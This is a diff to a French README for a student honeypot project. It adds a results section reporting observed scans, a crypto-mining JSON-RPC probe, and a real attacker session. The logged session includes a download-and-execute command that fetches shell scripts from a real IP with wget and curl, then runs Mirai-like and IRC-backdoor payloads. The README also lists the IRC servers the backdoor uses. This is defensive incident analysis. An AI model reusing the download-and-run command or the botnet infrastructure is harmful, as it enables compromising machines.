@@ -206,9 +206,13 @@ Ne prend aucun argument.
 
 <br/>
 
+
+<a id="foreign-data"></a>
+
 ```
 on_foreign_data
 ```
+
 > Appelé lorsque le port reservé à la reception de données provenant du honeypot reçoit des données suspectes ne respectant pas le protocole de communication établit. Cet évènement n'est pas obligatoirement lié au honeypot, le port du serveur étant exposé sur internet/sur le réseau local.  
 Prend un argument, de type `str` qui correspond au contenu du message reçu sur le port.
 
@@ -355,6 +359,57 @@ Pour démontrer la modularité et la capacité d'adaptation de notre honeypot, n
 ![Tweet](./images/twitterAttack.png)
 
 ### 4.2 Résultats obtenu
-Durant une exposition sur internet d'environ une semaine sans interruption, plusieurs comportements on été detectés,
+Durant une exposition sur internet d'environ une semaine sans interruption, plusieurs comportements on été detectés, le plus courant étant une simple connection ssh sans aucune commandes tapées, probablement des robots récoltant les IP de tout les serveurs aux crédentiels par défault sans faire de commandes dessus, durant la durée du test, une bonne 20aine de connections de ce genre on pu être observées. Un autre type d'attaque à aussi été présent couramment, étonnament ce n'était pas directement relié au honeypot, mais au serveur attendant les ping du honeypot. En effet, la requête suivante à été envoyée de nombreuses fois au serveur sur le port 13000:
+
+```
+<24-3_13h47> [WARNING] - foreign data:
+POST / HTTP/1.0
+Content-Length: 51
+Content-Type: application/json
+
+{"id":0,"jsonrpc":"2.0","method":"eth_blockNumber"}
+```
+Le serveur détecte automatiquement les données ne venant pas du honeypot et adopte le comportement [foreign data](#foreign-data), ici nous l'affichons simplement à la console. Ce n'est pas directement une attaque sur le honeypot, mais probablement une tentative de minage de crypto monnaie envoyée sur le port ouvert de notre serveur.
+
+Enfin, nous avons pu assister à une réelle attaque qui marque aussi la fin de l'exposition directe sur internet, le 21 octobre 2022 de 16h15 à 16h19. Ci-dessous, les logs de l'attaque effectuée.
+```
+<04-21_16h15> [91.134.127.80] - cd /data/local/tmp/; busybox wget http://205.185.116.110/w.sh; sh w.sh; curl http://205.185.116.110/c.sh; sh c.sh
+<04-21_16h15> [91.134.127.80] - ls
+<04-21_16h15> [91.134.127.80] - file *
+<04-21_16h16> [91.134.127.80] - htop
+<04-21_16h16> [91.134.127.80] - !
+<04-21_16h16> [91.134.127.80] - ./sh4
+<04-21_16h16> [91.134.127.80] - exit
+<04-21_16h18> [91.134.127.80] - nano botnet.sj
+<04-21_16h19> [91.134.127.80] - nano botnet.sh
+<04-21_16h19> [91.134.127.80] - chmod +x botnet.sh 
+<04-21_16h19> [91.134.127.80] - ./botnet.sh
+```
+Grâce à la gestions des snapshots, nous avons aussi pu récupérer tout les fichiers télechargés sur la machine, soit: ``w.sh``, ``c.sh``, ``sh4`` et ``botnet.sh``. Pour des raisons évidentes ils ne sont pas disponibles sur le git, mais sont en notre possession.
+
+Après avoir mené une analyse, ``w.sh`` et ``c.sh`` sont des scripts detéctant la plateforme du système et téléchargeant un autre fichier distant qui correspond à la plateforme cible. Ici, ``sh4`` est un ELF, un exécutable linux, mais grâce à l'analyse des scripts, nous avons aussi pu trouver des fichiers similaires pour des plateformes diférentes, soit ARM, Android, EXE... 
+
+``sh4`` se trouve être un malware de type trojan qui semblerait être le trojan MIRAI-BOTNET, voici un lien vers [l'analyse VirusTotal du fichier](https://www.virustotal.com/gui/file/793bf9870d0a744231f410116a26693eb835e7439b51cc45c2f059b59e4ad036/detection)
+
+Enfin, ``botnet.sh`` ne semble pas être un malware connu, et après l'avoir analysé, nous sommes en capacité d'affirmer que c'est une backdoor implémentée en [IRC](https://en.wikipedia.org/wiki/Internet_Relay_Chat), un compte IRC automatisé qui attend de recevoir un message privé, vérifie que le message privé contient une certaine clé et exécute la commande passé par message si la clé est correcte.
+
+Nous avons aussi récupéré la liste des serveurs IRC sur lequels le bot/backdoor se connecte, la voici:
+
+```
+ix1.undernet.org # biret
+ix2.undernet.org # biret
+Ashburn.Va.Us.UnderNet.org # biret
+Bucharest.RO.EU.Undernet.Org # biret
+Budapest.HU.EU.UnderNet.org # biret
+Chicago.IL.US.Undernet.org # biret
+```
+
+Grâce à nos investigations, nous avons pu nous connecter à ces serveurs IRC, et en effet, des bots sont bien présents !
+
+![](./images/IRCbot.png)
+
+``/!\ Disclaimer:`` (Y'a des trucs chelou et probablement des trucs pas légaux sur le serveur IRC, be aware.)
+
+
 <a id="conclusion"></a>
   ## **5. Conclusion**
